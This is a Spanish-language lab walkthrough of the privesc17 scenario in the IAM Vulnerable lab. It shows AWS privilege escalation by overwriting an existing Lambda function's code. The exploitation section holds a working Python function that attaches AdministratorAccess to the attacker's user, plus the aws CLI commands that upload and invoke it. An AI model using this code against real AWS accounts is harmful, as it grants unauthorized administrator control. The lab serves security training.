---
description: 'Lab: IAM vulnerable'
---

# EditExistingLambdaFunctionWithRole

## Laboratorio

En este apartado se observará el ejemplo utilizando el laboratorio IAM vulnerable con el escenario privesc17.  Para la correcta elevación de privilegios, depende de la interacción de otro usuario o de que la función actualizada sea ejecutada.

{% embed url="https://bishopfox.com/blog/privilege-escalation-in-aws" %}
Lab: IAM - Vulnerable | Escenario: privesc17
{% endembed %}

Un atacante con el permiso <mark style="color:green;">**lambda:UpdateFunctionCode**</mark> podría actualizar el código en una función Lambda existente con un rol de IAM adjunto para que importara la biblioteca de AWS relevante en ese lenguaje de programación y la usara para realizar acciones en nombre de ese rol.

### Configuración Inicial

Usuario del laboratorio: privesc17- EditExistingLambdaFunctionWithRole-user con los permisos:

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

La cuenta de AWS debe contener una función Lambda existente, con un rol adjunto que tenga el permiso <mark style="color:green;">iam:AttachUserPolicy.</mark>

Tambien es necesario tener en la infraestructura de pruebas un lambda ya configurado con cualquier funcionalidad con el rol a cual se va a asociar:

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Posterior mente generar llaves e acceso desde cuenta administrador para interactuar con el usuario en AWS CLI y configurar un perfil para el usuario del laboratorio

<figure><img src="../../../.gitbook/assets/image (7) (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>



### Explotación

En este escenario, se va a utilizar el privilegio del usuario <mark style="color:green;">**lambda:UpdateFunctionCode**</mark> para actualizar una función de lambda existente y añadirle código malicioso encargado de adjuntar una política de altos privilegios a nuestro usuario inicial.

La función lambda maliciosa es la siguiente.

{% code title="lambda_function.py" overflow="wrap" %}
```python
import boto3
def lambda_handler(event, context): 
	client = boto3.client('iam')
	response = client.attach_user_policy(UserName='privesc17- EditExistingLambdaFunctionWithRole-user', 
	PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
	return response
```
{% endcode %}

Para subir el archivo de la nueva función lambda se usará el permiso <mark style="color:green;">**lambda:UpdateFunctionCode**</mark> es necesario llamar el archivo <mark style="color:green;">**lambda\_function.py**</mark> y luego comprimir el archivo en formato zip con el nombre <mark style="color:green;">**function.zip.**</mark> Después ejecutar el código:

{% code overflow="wrap" %}
```
aws lambda update-function-code --function-name FuncionHelloWorld --zip-file fileb://function.zip --profile privesc17
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>

Cuando se ejecuta la función, se elevan los privilegios del atacante. Si el atacante tiene el permiso <mark style="color:green;">**lambda:InvokeFunction**</mark>, entonces es posible simplemente invocar la función directamente. De lo contrario, ocurrirá cuando otro usuario o servicio ejecute la función. En el siguiente ejemplo, otro usuario ejecuta la función.

El siguiente comando muestra a otro usuario de AWS invocando la lambda.

```
aws lambda invoke --function-name FuncionHelloWorld output.txt --profile other
```

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Finalmente ejecutando iam list attached user policies, podemos observar como el usuario inicial a ganado permisos de administrador:

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>



